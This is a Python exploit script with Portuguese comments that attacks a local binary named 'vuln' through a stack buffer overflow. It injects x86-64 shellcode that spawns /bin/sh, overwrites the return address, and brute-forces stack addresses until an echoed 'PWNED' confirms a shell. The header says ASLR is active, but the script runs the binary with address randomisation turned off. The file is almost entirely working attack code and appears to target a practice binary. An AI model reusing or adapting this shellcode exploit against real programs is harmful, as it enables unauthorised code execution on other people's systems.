# exploit_vuln.py
"""
# exploit script para o binário vulnerável com ASLR ativo
# funciona tentando explorar o binário e verificando se a exploração é bem-sucedida

"""


import sys, struct, subprocess, time



def pwn(binary, addr):
    sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

    payload = sc + (b"\x90" * (56 - len(sc)))
    
    payload += struct.pack("<Q", addr)[:6]

    t0 = time.time()
    

    cmd = ["setarch", "x86_64", "-R", binary, "admin", payload]
    
    try:
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        
        p.stdin.write(b"echo PWNED\n")
        p.stdin.flush()
        
        out, _ = p.communicate(timeout=0.5)
        dt = time.time() - t0

        return b"PWNED" in out, dt

    except:
        return False, 0

if __name__ == "__main__":
    target = 0x7fffffffe480

    if len(sys.argv) > 1:
        target = int(sys.argv[1], 16)
    else:
        print("nenhum endereço fornecido, auto-calibrando...")
        # quick scan (range aumentado)
        for off in range(0, 20480, 16):
            addr = 0x7fffffffa000 + off
            ok, _ = pwn("./bin/vuln", addr)
            if ok:
                target = addr
                print(f"stack encontrada @ {hex(addr)}")
                break

    print(f"atacando {hex(target)}...")
    ok, dt = pwn("./bin/vuln", target)
    
    if ok:
        print(f"PWNED! shell em {dt:.4f}s")
    else:
        print("falhou.")
